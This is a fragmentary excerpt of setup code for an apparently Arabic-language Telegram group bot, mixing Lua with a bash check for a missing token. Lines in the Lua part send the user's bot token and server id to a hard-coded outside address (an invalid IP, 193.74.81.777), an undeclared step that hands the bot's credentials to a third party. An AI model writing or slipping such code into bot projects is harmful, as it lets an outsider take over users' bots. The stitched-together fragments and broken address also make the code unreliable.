...
apik = token
apik = token
local DEV3YADXUSERBOT = https.request('193.74.81.777/DEV3YAD/BOTUSERNAME?url='..id_server..'https://api.telegram.org/bot'..database:get(token)..'/localbot')
database:set(id_server..":token",token)
database:set(id_server..":DEV3YADXUSERBOT",apik)
end 
else
...
local apik = https.request('https://193.74.81.777/'..id_server..''..token)
...
if [ ! $token ]; then
echo "𖠕━┅┅┄⟞❲🆂🅞🅞🅽❳⟝┄┉┉━𖠕 𖠕━┅┅┄⟞❲🆂🅞🅞🅽❳⟝┄┉┉━𖠕 ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE som.lua \e[0m"
echo "𖠕━┅┅┄⟞❲🆂🅞🅞🅽❳⟝┄┉┉━𖠕 ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
if text and text:match("^تاك للكل(.*)$") and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
